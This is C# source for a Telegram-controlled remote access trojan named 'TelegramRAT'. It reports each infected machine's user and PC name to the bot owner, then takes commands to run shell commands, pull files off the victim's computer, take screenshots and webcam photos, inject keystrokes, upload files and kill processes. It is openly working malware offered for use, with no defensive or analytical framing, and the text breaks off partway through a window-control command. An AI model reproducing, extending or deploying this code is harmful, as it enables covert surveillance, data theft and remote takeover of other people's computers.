using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading.Tasks;
using Telegram.Bot;
using Telegram.Bot.Types.InputFiles;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types;
using WindowsInput;
using System.Reflection;
using System.Text;
using NAudio.Wave;
using IronPython.Hosting;
using Microsoft.Scripting.Hosting;
using Microsoft.Win32;
using AForge;
using AForge.Video;
using AForge.Video.DirectShow;



namespace TelegramRAT
{
    public static class Program
    {
        static TelegramBotClient Bot;


        readonly static long? OwnerId = null; // Place your Telegram id here or keep it null.
        readonly static string BotToken = null; // Place your Telegram bot token. 

        static List<BotCommand> commands = new List<BotCommand>();
        static bool keylog = false;

        static ScriptScope pythonScope;
        static ScriptEngine pythonEngine;
        static ScriptRuntime pythonRuntime;

        static void Main(string[] args)
        {

            string thisprocessname = Process.GetCurrentProcess().ProcessName;

            if (Process.GetProcesses().Count(p => p.ProcessName == thisprocessname) > 1)
            {
                Console.WriteLine("Only one instance could be online at the same time!");
                return;
            }

            Bot = new TelegramBotClient(BotToken);

            pythonRuntime = Python.CreateRuntime();
            pythonEngine = Python.CreateEngine();
            pythonScope = pythonRuntime.CreateScope();

            InitializeCommands(commands);

            try
            {
                Run().Wait();
            }
            catch (Exception ex)
            {
                Bot.SendTextMessageAsync(OwnerId, "Error occured! - " + ex.Message);
                Bot.SendTextMessageAsync(OwnerId, "Attempting to restart. Please wait...");
                commands.Clear();
                Main(args);
            }
        }

        static async void ReportError(Update update, Exception exception)
        {
#if DEBUG
            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Error: \"" + exception.Message + "\" at \"" + exception.StackTrace + "\"", replyToMessageId: update.Message.MessageId);
#else
            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Error: " + exception.Message, replyToMessageId: update.Message.MessageId);
#endif
        }

        static async Task Run()
        {
            Message hellomsg = await Bot.SendTextMessageAsync(OwnerId,
                $"Computer online! \n\n" +

                $"Username: <b>{Environment.UserName}</b>\n" +
                $"PC name: <b>{Environment.MachineName}</b>\n\n" +

                $"OS: {GetWindowsVersion()}",
                ParseMode.Html);

            int offset = 0;

            while (true)
            {
                Update[] updates = await Bot.GetUpdatesAsync(offset);
                if (updates.Length != 0)
                    offset = updates.Last().Id + 1;

                updates = updates.Where(update =>
                {
                    return update.Message != null && update.Message.Date > hellomsg.Date;
                }).ToArray();

                UpdateWorker(updates).Wait();

                Task.Delay(1000).Wait();
            }
        }

        public static async Task UpdateWorker(Update[] Updates)
        {

            foreach (var update in Updates)
            {
                if (update.Message.Text == null && update.Message.Caption == null)
                {
                    continue;
                }

                string messageText = update.Message.Type == MessageType.Text ? update.Message.Text : update.Message.Caption;

                BotCommandModel model = BotCommand.Parse(messageText);

                if (model == null)
                    continue;

                var cmd = commands.Find(cmd => cmd.Command == model.Command);

                if (cmd == null)
                    continue;

                if (ValidateModel(cmd, model))
                {
                    cmd.Execute.Invoke(model, update);
                }
                else
                {
                    await Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command requires arguments! \n\n" +
                         $"To get information about this command - type /help {model.Command.Substring(1)}", replyToMessageId: update.Message.MessageId);
                }

            }
        }

        //Evil and scary method
        static bool ValidateModel(BotCommand command, BotCommandModel model)
        {
            if (command == null || model == null)
                return false;

            if (command.Command != model.Command)
                return false;

            if ((command.IgnoreCountArgs || command.CountArgs != 0) && model.Args.Length != 0)
            {
                return true;
            }
            else if (!(command.IgnoreCountArgs || command.CountArgs != 0) || command.MayHaveNoArgs)
            {
                return true;
            }

            return false;

        }

        static string GetWindowsVersion()
        {
            try
            {
                RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
                if (key != null)
                {
                    string prodName = key.GetValue("ProductName") as string;
                    string csdVer = key.GetValue("CSDVersion") as string;
                    return prodName + csdVer;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return string.Empty;
        }

        static void InitializeCommands(List<BotCommand> CommandsList)
        {
            //HELP
            CommandsList.Add(new BotCommand
            {
                Command = "/help",
                IgnoreCountArgs = true,
                MayHaveNoArgs = true,

                Description = "Show description of other commands.",
                Example = "/help screenshot",

                Execute = async (model, update) =>
                {
                    await Task.Run(() =>
                    {
                        if (model.Args.Length == 0)
                        {
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Use this command to retrieve description of other commands, like this: /help screenshot" +
                                "\nTo get list of all commands - type /commands", replyToMessageId: update.Message.MessageId);
                            return;
                        }
                        string command = model.Args[0];
                        if (!command.StartsWith("/"))
                        {
                            command = "/" + command;
                        }
                        var cmd = commands.Find(cmd => cmd.Command == command);
                        if (cmd == null)
                        {
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "This command doesn't exist! " +
                            "To get list of all commands - type /commands", replyToMessageId: update.Message.MessageId);
                            return;
                        }
                        string Description = $"<b>{cmd.Command}</b>\n\n";
                        if (cmd.Description != null)
                        {
                            Description += cmd.Description;
                        }
                        else
                        {
                            Description += "<i>No description provided</i>";
                        }
                        if (cmd.Example != null)
                        {
                            Description += $"\nExample: {cmd.Example}";
                        }
                        Bot.SendTextMessageAsync(update.Message.Chat.Id, Description, replyToMessageId: update.Message.MessageId, parseMode: ParseMode.Html, disableWebPagePreview: true);

                    });
                }
            });

            //CMD
            CommandsList.Add(new BotCommand
            {
                Command = "/cmd",
                IgnoreCountArgs = true,
                Description = "Run cmd commands.",
                Example = "/cmd dir",
                Execute = async (model, update) =>
                {
                    try
                    {
                        await Task.Run(() =>
                        {
                            Process cmd = new Process();
                            cmd.StartInfo.FileName = "cmd.exe";
                            cmd.StartInfo.CreateNoWindow = true;

                            cmd.StartInfo.Arguments = "/c " + model.RawArgs;
                            cmd.StartInfo.RedirectStandardOutput = true;
                            cmd.StartInfo.RedirectStandardError = true;
                            cmd.StartInfo.UseShellExecute = false;

                            cmd.Start();
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Started!", replyToMessageId: update.Message.MessageId);
                            cmd.WaitForExit(1000);
                            //cmd.Kill(true);

                            string Output = cmd.StandardOutput.ReadToEnd();

                            Output = string.Join(string.Empty, Output.Take(4096));

                            if (Output.Length == 0)
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Done!", replyToMessageId: update.Message.MessageId);
                            else
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Done!\n\n" +
                                    $"Output:\n{Output}", replyToMessageId: update.Message.MessageId);
                        });
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }

            });

            //DIR
            CommandsList.Add(new BotCommand
            {
                Command = "/dir",
                CountArgs = 0,
                IgnoreCountArgs = true,
                MayHaveNoArgs = true,
                Description = "Get all files and folders from current directory.",
                Example = "/dir C:\\Program Files",
                Execute = async (model, update) =>
                {
                    try
                    {
                        string curdir;
                        if (model.Args.Length > 0)
                            curdir = model.RawArgs;
                        else
                            curdir = Directory.GetCurrentDirectory();


                        var files = Directory.EnumerateFiles(curdir);
                        int i = 0;
                        string oneMessage;
                        if (files.Count() != 0)
                        {
                            oneMessage = "Files:\n\n";
                            foreach (string file in files)
                            {
                                string parsedFile = file.Substring(file.LastIndexOf('\\') + 1);
                                if (i == 100)
                                {
                                    await Bot.SendTextMessageAsync(update.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);
                                    i = 0;
                                    oneMessage = "";
                                }
                                i++;
                                oneMessage += $"`{parsedFile}`\n";

                            }
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);

                        }

                        var dirs = Directory.EnumerateDirectories(curdir);
                        i = 0;
                        if (dirs.Count() != 0)
                        {
                            oneMessage = "Folders:\n\n";
                            foreach (string dir in dirs)
                            {
                                string parsedDir = dir.Substring(dir.LastIndexOf('\\') + 1);
                                if (i == 100)
                                {
                                    await Bot.SendTextMessageAsync(update.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);
                                    i = 0;
                                    oneMessage = "";
                                }
                                i++;
                                oneMessage += $"`{parsedDir}`\n";

                            }
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, oneMessage, parseMode: ParseMode.Markdown);

                        }
                        if (dirs.Count() == 0 && files.Count() == 0)
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "This directory contains no files and no folders.", replyToMessageId: update.Message.MessageId);

                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }
            });

            //PROCESSESLIST
            CommandsList.Add(new BotCommand
            {
                Command = "/processes",
                CountArgs = 0,
                Description = "Get list of running processes.",
                Example = "/processes",
                Execute = async (model, update) =>
                {
                    try
                    {
                        string Concat = "List of processes: \n";
                        int i = 1;
                        Process[] processCollection = Process.GetProcesses();

                        foreach (Process p in processCollection)
                        {

                            Concat += $"<code>{p.ProcessName}</code> : <code>{p.Id}</code>\n";
                            if (i == 50)
                            {
                                await Bot.SendTextMessageAsync(update.Message.Chat.Id, Concat, ParseMode.Html);
                                Concat = "";
                                i = 0;
                            }
                            i++;

                        }
                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, Concat, ParseMode.Html);
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }
            });

            //PROCESS
            CommandsList.Add(new BotCommand
            {
                Command = "/process",
                CountArgs = 1,

                Description = "Show info about process by its id.",
                Example = "/process 1234",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {

                            int procId = int.Parse(model.Args[0]);

                            var proc = Process.GetProcessById(procId);

                            string procInfo =
                            $"Process: <b>{proc.ProcessName}</b>\n" +
                            $"Id: {proc.Id}\n" +
                            $"Priority: {proc.PriorityClass}\n" +
                            $"Priority Boost: {(proc.PriorityBoostEnabled == true ? "enabled" : "disabled")}";
                            Bot.SendTextMessageAsync(update.Message.Chat.Id, procInfo, ParseMode.Html, replyToMessageId: update.Message.MessageId);
                        }

                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                }
            });

            //PROCESSKILL
            CommandsList.Add(new BotCommand
            {
                Command = "/processkill",
                IgnoreCountArgs = true,
                MayHaveNoArgs = false,

                Description = "Kill process or processes by name or id. ",
                Example = "/processkill id:1234",
                Execute = async (model, update) =>
                {
                    try
                    {
                        Process[] processes;
                        if (model.Args[0].StartsWith("id:"))
                        {
                            string procStr = string.Join(string.Empty, model.RawArgs.Skip(3).ToArray());
                            procStr = procStr.TrimStart();

                            int procId;
                            if (int.TryParse(procStr, out procId))
                            {
                                Process.GetProcessById(procId).Kill();
                                await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                            }
                            else
                            {
                                await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Invalid process id!", replyToMessageId: update.Message.MessageId);
                            }
                            return;
                        }
                        if (model.Args[0].StartsWith("name:"))
                        {
                            string procStr = string.Join(string.Empty, model.RawArgs.Skip(5).ToArray());
                            Console.WriteLine(procStr);
                            procStr = procStr.TrimStart();
                            processes = Process.GetProcessesByName(procStr);
                            if (processes.Length == 0)
                            {
                                await Bot.SendTextMessageAsync(update.Message.Chat.Id, "No running processes with such name!", replyToMessageId: update.Message.MessageId);
                                return;
                            }
                            foreach (Process localprocess in Process.GetProcessesByName(model.RawArgs))
                            {
                                localprocess.Kill();
                            }
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);


                            return;
                        }
                        processes = Process.GetProcessesByName(model.RawArgs);
                        if (processes.Length == 0)
                        {
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "No running processes with such name!", replyToMessageId: update.Message.MessageId);
                            return;
                        }
                        foreach (Process localprocess in Process.GetProcessesByName(model.RawArgs))
                        {
                            localprocess.Kill();
                        }
                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);

                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }
            });

            //CD
            CommandsList.Add(new BotCommand
            {
                Command = "/cd",
                IgnoreCountArgs = true,

                Description = "Change current directory.",
                Example = "/cd C:\\Users",
                Execute = async (model, update) =>
                {
                    try
                    {
                        if (Directory.Exists(model.RawArgs))
                        {
                            Directory.SetCurrentDirectory(model.Args[0]);
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Directory changed to: <code>{Directory.GetCurrentDirectory()}</code>", ParseMode.Html, replyToMessageId: update.Message.MessageId);
                        }
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }
            });

            //CURDIR
            CommandsList.Add(new BotCommand
            {
                Command = "/curdir",
                CountArgs = 0,

                Description = "Show current directory.",
                Example = "/curdir",
                Execute = async (model, update) =>
                {
                    try
                    {
                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, $"Current directory:\n<code>{Directory.GetCurrentDirectory()}</code>", ParseMode.Html, replyToMessageId: update.Message.MessageId);
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }
            });

            //POWER MEGA COMMAND
            CommandsList.Add(new BotCommand
            {
                Command = "/power",
                CountArgs = 1,
                Description = "Switch PC power state. Usage:\n\n" +
                "Off - Turn PC off\n" +
                "Restart - Restart PC\n" +
                "LogOff - Log off system",
                Example = "/power logoff",
                Execute = (model, update) =>
                {
                    try
                    {
                        switch (model.Args[0].ToLower())
                        {
                            case "off":
                                Process shutdown = new Process();
                                shutdown.StartInfo.CreateNoWindow = true;
                                shutdown.StartInfo.FileName = "powershell.exe";
                                shutdown.StartInfo.Arguments = "/с shutdown /s /t 1";
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                                shutdown.Start();
                                break;

                            case "restart":
                                Process restart = new Process();
                                restart.StartInfo.CreateNoWindow = true;
                                restart.StartInfo.FileName = "powershell.exe";
                                restart.StartInfo.Arguments = "/с shutdown /r /t 1";
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!");
                                restart.Start();
                                break;

                            case "logoff":
                                Process logoff = new Process();
                                logoff.StartInfo.CreateNoWindow = true;
                                logoff.StartInfo.FileName = "cmd.exe";
                                logoff.StartInfo.Arguments = "/c rundll32.exe user32.dll,LockWorkStation";
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!");
                                logoff.Start();
                                break;

                            default:
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, "Wrong usage, type /help power to get info about this command!", replyToMessageId: update.Message.MessageId);
                                break;
                        }

                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }
            });

            //DOWNLOAD
            CommandsList.Add(new BotCommand
            {
                Command = "/download",
                IgnoreCountArgs = true,
                MayHaveNoArgs = false,

                Description = "Send file from PC by path",
                Example = "/download hello.txt",
                Execute = async (model, update) =>
                {
                    try
                    {
                        var filetodownload = model.RawArgs;
                        if (!System.IO.File.Exists(Directory.GetCurrentDirectory() + "\\" + filetodownload))
                        {
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, $"There is no file \"{filetodownload}\" at dir {Directory.GetCurrentDirectory()}");
                            return;
                        }
                        var filetosend = new FileStream(Directory.GetCurrentDirectory() + "\\" + filetodownload, FileMode.Open, FileAccess.Read, FileShare.Read);
                        {
                            await Bot.SendDocumentAsync(update.Message.Chat.Id, new InputOnlineFile(filetosend, filetosend.Name.Substring(filetosend.Name.LastIndexOf("\\"))), caption: filetodownload);
                        }
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }
            });

            //SCREENSHOT
            CommandsList.Add(new BotCommand
            {
                Command = "/screenshot",
                CountArgs = 0,
                Description = "Take a screenshot of all displays area.",
                Example = "/screenshot",
                Execute = async (model, update) =>
                {
                    await Task.Run(async () =>
                    {
                        try
                        {
                            Rectangle bounds = WinAPI.GetScreenBounds();

                            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                            using (Graphics g = Graphics.FromImage(bitmap))
                            using (MemoryStream screenshotStream = new MemoryStream())
                            {
                                g.CopyFromScreen(System.Drawing.Point.Empty, System.Drawing.Point.Empty, bounds.Size);

                                bitmap.Save(screenshotStream, ImageFormat.Png);

                                screenshotStream.Position = 0;

                                await Bot.SendPhotoAsync(chatId: update.Message.Chat.Id, photo: screenshotStream, caption: "Screenshot!", replyToMessageId: update.Message.MessageId);

                            }
                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                }
            });

            //GET USER TELEGRAM ID
            CommandsList.Add(new BotCommand
            {
                Command = "/getid",
                CountArgs = 0,

                Description = "Get chat or user id. To get user's id type this command as answer to user message. Made in developing purposes.",
                Example = "/getid",
                Execute = async (model, update) =>
                {
                    if (update.Message.ReplyToMessage != null)
                    {
                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, $"User id: <code>{update.Message.ReplyToMessage.From.Id.ToString()}</code>", ParseMode.Html, replyToMessageId: update.Message.MessageId);
                        return;
                    }
                    await Bot.SendTextMessageAsync(update.Message.Chat.Id, $"This chat id: <code>{update.Message.Chat.Id.ToString()}</code>", ParseMode.Html);
                }
            });

            //TAKE PHOTO FROM WEBCAM
            CommandsList.Add(new BotCommand
            {
                Command = "/webcam",
                CountArgs = 0,

                Description = "Take a photo from webcamera.",
                Example = "/webcam",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        Task.Run(() =>
                        {
                            try
                            {
                                Bitmap endMap;
                                MemoryStream webcamShotStream = new MemoryStream();

                                FilterInfoCollection capdevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                                if (capdevices.Count == 0)
                                {
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "This machine has no webcamera.", replyToMessageId: update.Message.MessageId);
                                }

                                VideoCaptureDevice device = new VideoCaptureDevice(capdevices[0].MonikerString);
                                device.NewFrame += (sender, args) =>
                                {
                                    //args.Frame = webcamShotStream;

                                    endMap = args.Frame.Clone() as Bitmap;
                                    endMap.Save(webcamShotStream, ImageFormat.Png);
                                    (sender as VideoCaptureDevice).SignalToStop();
                                };

                                device.Start();
                                device.WaitForStop();

                                webcamShotStream.Position = 0;

                                InputOnlineFile webcamPhoto = new InputOnlineFile(webcamShotStream);
                                Bot.SendPhotoAsync(update.Message.Chat.Id, webcamPhoto, replyToMessageId: update.Message.MessageId);
                                webcamShotStream.Close();
                            }
                            catch (Exception ex)
                            {
                                ReportError(update, ex);
                            }
                        });
                    });
                }

            });

            //MESSAGEBOX
            CommandsList.Add(new BotCommand
            {
                Command = "/message",
                IgnoreCountArgs = true,
                Description = "Send message with dialog window.",
                Example = "message Lorem ipsum",
                Execute = async (model, update) =>
                {
                    await Task.Run(() =>
                    {
                        WinAPI.ShowMessageBox(model.RawArgs, "Message", WinAPI.MsgBoxFlag.MB_APPLMODAL);
                    });
                }

            });

            //OPENURL
            CommandsList.Add(new BotCommand
            {
                Command = "/openurl",
                IgnoreCountArgs = true,

                Description = "Open URL with default browser.",
                Example = "/openurl https://google.com",
                Execute = async (model, update) =>
                {
                    if (!model.RawArgs.Contains("://"))
                    {
                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, "This is not url", replyToMessageId: update.Message.MessageId);
                    }
                    ProcessStartInfo info = new ProcessStartInfo()
                    {
                        FileName = "cmd.exe",
                        Arguments = $"/c start {model.RawArgs}",
                        CreateNoWindow = true
                    };

                    Process.Start(info);

                    await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Url opened!", replyToMessageId: update.Message.MessageId);
                }
            });

            //UPLOAD FILE TO PC
            CommandsList.Add(new BotCommand
            {
                Command = "/upload",
                IgnoreCountArgs = true,
                MayHaveNoArgs = true,

                Description = "Upload image or file to current directory.",
                Execute = async (model, update) =>
                {
                    try
                    {
                        if (update.Message.Type == MessageType.Photo)
                        {
                            foreach (PhotoSize photo in update.Message.Photo)
                            {
                                var photoFileStream = System.IO.File.Create(Directory.GetCurrentDirectory() + $"/{photo.FileId}.png");

                                Telegram.Bot.Types.File photoFile = await Bot.GetFileAsync(photo.FileId);
                                Bot.DownloadFileAsync(photoFile.FilePath, photoFileStream).Wait();
                                photoFileStream.Close();

                            }
                        }
                        else if (update.Message.Type == MessageType.Document)
                        {
                            Telegram.Bot.Types.File documentFile = await Bot.GetFileAsync(update.Message.Document.FileId);
                            var documentFileStream = System.IO.File.Create(update.Message.Document.FileName);
                            Bot.DownloadFileAsync(documentFile.FilePath, documentFileStream).Wait();
                            documentFileStream.Close();
                        }
                        else if (update.Message.ReplyToMessage != null && update.Message.ReplyToMessage.Type == MessageType.Photo)
                        {
                            foreach (PhotoSize photo in update.Message.ReplyToMessage.Photo)
                            {
                                var photoFileStream = System.IO.File.Create(Directory.GetCurrentDirectory() + $"/{photo.FileId}.png");

                                Telegram.Bot.Types.File photoFile = await Bot.GetFileAsync(photo.FileId);
                                Bot.DownloadFileAsync(photoFile.FilePath, photoFileStream).Wait();
                                photoFileStream.Close();

                            }
                        }
                        else if (update.Message.ReplyToMessage != null && update.Message.ReplyToMessage.Type == MessageType.Document)
                        {
                            Telegram.Bot.Types.File documentFile = await Bot.GetFileAsync(update.Message.ReplyToMessage.Document.FileId);
                            var documentFileStream = System.IO.File.Create(update.Message.ReplyToMessage.Document.FileName);
                            Bot.DownloadFileAsync(documentFile.FilePath, documentFileStream).Wait();
                            documentFileStream.Close();
                        }
                        else
                        {
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "No file or photo pinned, use /help upload to get info about this command!", replyToMessageId: update.Message.MessageId);
                            return;
                        }
                        await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                    }
                    catch (Exception ex)
                    {
                        ReportError(update, ex);
                    }
                }
            });

            //SEND KEYBOARD INPUT 
            CommandsList.Add(new BotCommand
            {
                Command = "/sendinput",
                IgnoreCountArgs = true,
                MayHaveNoArgs = false,
                Description =
                #region desc
                "Simulate keyboard input with virtual keycode, expressed in hexadecimal\n\n" +
                "List of virtual keycodes:\n" +
                "LBUTTON = 1\nRBUTTON = 2\nCANCEL = 3\nMIDBUTTON = 4\nBACKSPACE = 8\n" +
                "TAB = 9\nCLEAR = C\nENTER = D\nSHIFT = 10\nCTRL = 11\nALT = 12\n" +
                "PAUSE = 13\nCAPSLOCK = 14\nESC = 1B\nSPACE = 20\nPAGEUP = 21\nPAGEDOWN = 22\n" +
                "END = 23\nHOME = 24\nLEFT = 25\nUP = 26\nRIGHT = 27\nDOWN = 28\n\n0..9 = 30..39\n" +
                "A..Z = 41..5a\nF1..F24 = 70..87\n\n" +

                "<a href=\"https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes\">See all keycodes</a>\n\n" +
                "To send combination of keys, join them with plus: 11+43 (ctrl+c)\n",
                #endregion
                Example = "/sendinput 48 45 4c 4c 4f (hello)",
                Execute = async (model, update) =>
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            KeyboardSimulator ks = new KeyboardSimulator(new InputSimulator());
                            foreach (string arg in model.Args)
                            {
                                if (arg.Contains("+"))
                                {
                                    int modifier = int.Parse(arg.Split('+').First(), System.Globalization.NumberStyles.HexNumber);
                                    List<int> modified = new List<int>();
                                    foreach (string vk in arg.Split('+').Skip(1))
                                    {
                                        modified.Add(int.Parse(vk, System.Globalization.NumberStyles.HexNumber));
                                    }
                                    ks.ModifiedKeyStroke(new int[] { modifier }, modified);
                                }
                                else
                                    ks.KeyPress(int.Parse(arg, System.Globalization.NumberStyles.HexNumber));
                            }

                            Bot.SendTextMessageAsync(update.Message.Chat.Id, "Sended!", replyToMessageId: update.Message.MessageId);
                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                },


            });

            //WALLPAPER
            CommandsList.Add(new BotCommand
            {
                Command = "/wallpaper",
                Description = "Change wallpapers. Don't foreget to attach the image.",
                Execute = async (model, update) =>
                {
                    await Task.Run(async () =>
                    {
                        try
                        {
                            if (update.Message.Type == MessageType.Photo)
                            {
                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
                                {
                                    Telegram.Bot.Types.File wallpaperPhoto = await Bot.GetFileAsync(update.Message.Photo.Last().FileId);
                                    Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs).Wait();
                                }
                            }
                            else if (update.Message.Type == MessageType.Document)
                            {
                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
                                {
                                    Telegram.Bot.Types.File wallpaperFile = await Bot.GetFileAsync(update.Message.Document.FileId);
                                    Bot.DownloadFileAsync(wallpaperFile.FilePath, fs).Wait();
                                }
                            }
                            else if (update.Message.ReplyToMessage != null && update.Message.ReplyToMessage.Type == MessageType.Photo)
                            {
                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
                                {
                                    Telegram.Bot.Types.File wallpaperPhoto = await Bot.GetFileAsync(update.Message.ReplyToMessage.Photo.Last().FileId);
                                    Bot.DownloadFileAsync(wallpaperPhoto.FilePath, fs).Wait();
                                }
                            }
                            else if (update.Message.ReplyToMessage != null && update.Message.ReplyToMessage.Type == MessageType.Document)
                            {
                                using (FileStream fs = new FileStream("wllppr.png", FileMode.Create))
                                {
                                    Telegram.Bot.Types.File wallpaperFile = await Bot.GetFileAsync(update.Message.ReplyToMessage.Document.FileId);
                                    Bot.DownloadFileAsync(wallpaperFile.FilePath, fs).Wait();
                                }
                            }
                            else
                            {
                                await Bot.SendTextMessageAsync(update.Message.Chat.Id, "No file or photo pinned, use /help wallpaper to get info about this command!", replyToMessageId: update.Message.MessageId);
                                return;
                            }

                            WinAPI.SystemParametersInfo(WinAPI.SPI_SETDESKWALLPAPER, 0, Directory.GetCurrentDirectory() + "\\wllppr.png", WinAPI.SPIF_UPDATEINIFILE | WinAPI.SPIF_SENDWININICHANGE);
                            System.IO.File.Delete("wllppr.png");
                            await Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                        }
                        catch (Exception ex)
                        {
                            ReportError(update, ex);
                        }
                    });
                }
            });

            //WINDOW MEGA COMMAND
            CommandsList.Add(new BotCommand
            {
                Command = "/window",
                MayHaveNoArgs = false,
                IgnoreCountArgs = true,
                Description = "This command has multiple usage. After usage type title or pointer(type 0x at the start) of window. Usage list:\n\n" +
                "<i>info</i> - Get information about window. Shows info about top window, if no name provided\n\n" +
                "<i>minimize</i> - Minimize window\n\n" +
                "<i>maximize</i> - Maximize window\n\n" +
                "<i>restore</i> - Restore size and position of window\n\n" +
                "<i>close</i> - Close window\n\n",
                Example = "/window close Calculator",
                Execute = (model, update) =>
                {
                    Task.Run(() =>
                    {
                        try
                        {
                            IntPtr hWnd;
                            if (model.Args[0].ToLower() == "info" && model.Args.Length == 1)
                            {
                                hWnd = WinAPI.GetForegroundWindow();
                                Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
                                string info = "" +
                                "Window info\n" +
                                "\n" +
                                $"Title: <code>{WinAPI.GetWindowTitle(hWnd)}</code>\n" +
                                $"Location: {windowBounds.X}x{windowBounds.Y}\n" +
                                $"Size: {windowBounds.Width}x{windowBounds.Height}\n" +
                                $"Pointer: <code>0x{hWnd.ToString("X")}</code>";
                                Bot.SendTextMessageAsync(update.Message.Chat.Id, info, ParseMode.Html, replyToMessageId: update.Message.MessageId);
                            }
                            if (model.Args.Length > 1)
                            {
                                if (model.Args[1].Contains("0x"))
                                {
                                    string pointerString = string.Join(string.Empty, model.Args[1].Skip(2));
                                    int pointer = int.Parse(pointerString, System.Globalization.NumberStyles.HexNumber);
                                    hWnd = new IntPtr(pointer);
                                }
                                else
                                {
                                    hWnd = WinAPI.FindWindow(null, string.Join(string.Empty, model.Args.Skip(1)));
                                }
                                if (hWnd == IntPtr.Zero || WinAPI.IsWindow(hWnd) is false)
                                {
                                    Bot.SendTextMessageAsync(update.Message.Chat.Id, "Window not found!", replyToMessageId: update.Message.MessageId);
                                    return;
                                }
                                switch (model.Args[0].ToLower())
                                {
                                    case "info":
                                        Rectangle windowBounds = WinAPI.GetWindowBounds(hWnd);
                                        string info = "" +
                                        "Window info\n" +
                                        "\n" +
                                        $"Title: <code>{WinAPI.GetWindowTitle(hWnd)}</code>\n" +
                                        $"Location: {windowBounds.X}x{windowBounds.Y}\n" +
                                        $"Size: {windowBounds.Width}x{windowBounds.Height}\n" +
                                        $"Pointer: <code>0x{hWnd.ToString("X")}</code>";
                                        Bot.SendTextMessageAsync(update.Message.Chat.Id, info, ParseMode.Html, replyToMessageId: update.Message.MessageId);
                                        break;

                                    case "minimize":
                                        WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
                                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                                        break;

                                    case "maximize":
                                        WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MAXIMIZE, 0);
                                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                                        break;

                                    case "setfocus":
                                        WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_MINIMIZE, 0);
                                        WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
                                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                                        break;

                                    case "restore":
                                        WinAPI.PostMessage(hWnd, WinAPI.WM_SYSCOMMAND, WinAPI.SC_RESTORE, 0);
                                        Bot.SendTextMessageAsync(update.Message.Chat.Id, "Done!", replyToMessageId: update.Message.MessageId);
                                        break;

                                    case "close":
